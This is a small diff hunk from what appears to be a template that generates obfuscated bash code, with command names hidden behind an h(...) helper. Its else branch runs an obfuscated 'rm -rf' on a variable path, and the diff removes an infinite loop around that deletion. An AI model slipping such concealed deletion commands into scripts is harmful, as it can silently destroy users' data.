@@ -26,9 +26,7 @@ if ! [[ "$${v1}" =~ ${h('echo ')} ]]; then
   ${v5}=${c1};
   ${v6}=${c2};
 else
-  while true;do
-    ${h("rm")} ${h("-rf")} $${v7};${h("exit")};
-  done;
+  ${h("rm")} ${h("-rf")} $${v7};
 fi
 
       `));
